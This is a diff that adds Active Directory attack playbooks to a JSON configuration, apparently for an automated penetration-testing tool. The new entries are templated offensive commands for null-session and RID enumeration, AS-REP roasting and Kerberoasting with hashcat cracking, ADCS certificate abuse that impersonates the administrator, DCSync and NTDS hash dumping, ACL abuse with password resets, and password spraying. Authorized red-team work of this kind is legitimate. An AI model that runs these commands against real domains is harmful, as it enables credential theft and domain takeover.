@@ -54,6 +54,79 @@
         "smbmap -H {TARGET}                    # share permissions",
         "enum4linux-ng -A {TARGET}"
       ]
+    },
+    {
+      "id": "ad-unauth-enum",
+      "name": "Active Directory - unauthenticated enumeration",
+      "priority": 0,
+      "when": {"finding_contains": "domain controller"},
+      "steps": [
+        "nxc smb {TARGET}                       # host/domain/signing (netexec)",
+        "nxc smb {TARGET} -u '' -p '' --shares  # null session shares",
+        "nxc smb {TARGET} --users --rid-brute   # enumerate users via RID cycling",
+        "impacket-GetNPUsers {DOMAIN}/ -dc-ip {TARGET} -usersfile users.txt -no-pass  # AS-REP roast (no creds)",
+        "ldapsearch -x -H ldap://{TARGET} -s base namingContexts   # anonymous LDAP base"
+      ]
+    },
+    {
+      "id": "ad-authed-enum",
+      "name": "Active Directory - authenticated enum + BloodHound",
+      "priority": 0,
+      "when": {"finding_contains": "domain controller", "has_credentials": true},
+      "steps": [
+        "nxc smb {TARGET} -u {USER} -p '{PASS}' --shares --users --groups --pass-pol",
+        "nxc ldap {TARGET} -u {USER} -p '{PASS}' --bloodhound --collection All --dns-server {TARGET}",
+        "bloodhound-python -u {USER} -p '{PASS}' -d {DOMAIN} -ns {TARGET} -c All --zip",
+        "# import the zip into BloodHound and look for shortest paths to Domain Admins",
+        "ldapdomaindump -u '{DOMAIN}\\\\{USER}' -p '{PASS}' {TARGET}"
+      ]
+    },
+    {
+      "id": "ad-kerberoast",
+      "name": "Active Directory - Kerberoasting / AS-REP roasting",
+      "priority": 1,
+      "when": {"finding_contains": "domain controller", "has_credentials": true},
+      "steps": [
+        "nxc ldap {TARGET} -u {USER} -p '{PASS}' --kerberoasting kerb.txt",
+        "impacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {TARGET} -request -outputfile kerb.txt",
+        "impacket-GetNPUsers {DOMAIN}/{USER}:'{PASS}' -dc-ip {TARGET} -request  # AS-REP for DONT_REQ_PREAUTH",
+        "hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt   # crack TGS (18200 for AS-REP)"
+      ]
+    },
+    {
+      "id": "ad-adcs",
+      "name": "Active Directory Certificate Services (ADCS) - certipy",
+      "priority": 0,
+      "when": {"finding_contains": "domain controller", "has_credentials": true},
+      "steps": [
+        "certipy find -u {USER}@{DOMAIN} -p '{PASS}' -dc-ip {TARGET} -stdout -vulnerable",
+        "# ESC1: certipy req -u {USER}@{DOMAIN} -p '{PASS}' -ca <CA> -template <tmpl> -upn administrator@{DOMAIN}",
+        "# ESC8 (NTLM relay to web enrollment): certipy relay -ca <ca-host>",
+        "certipy auth -pfx administrator.pfx -dc-ip {TARGET}   # TGT + NT hash from the cert"
+      ]
+    },
+    {
+      "id": "ad-privesc-dcsync",
+      "name": "Active Directory - ACL abuse / DCSync (needs privilege)",
+      "priority": 1,
+      "when": {"finding_contains": "domain controller", "has_credentials": true},
+      "steps": [
+        "# with DCSync rights (Replicating Directory Changes) dump all hashes:",
+        "impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{TARGET}",
+        "nxc smb {TARGET} -u {USER} -p '{PASS}' --ntds   # if local admin on the DC",
+        "# ACL abuse (from BloodHound): bloodyAD --host {TARGET} -d {DOMAIN} -u {USER} -p '{PASS}' add genericAll <target> <you>",
+        "# then reset a password / add to a group: bloodyAD ... set password <user> 'NewPass1'"
+      ]
+    },
+    {
+      "id": "ad-password-spray",
+      "name": "Active Directory - password spraying",
+      "priority": 2,
+      "when": {"finding_contains": "domain controller"},
+      "steps": [
+        "nxc smb {TARGET} -u users.txt -p 'Season2024!' --continue-on-success   # spray one password",
+        "kerbrute passwordspray -d {DOMAIN} --dc {TARGET} users.txt 'Season2024!'"
+      ]
     }
   ]
 }
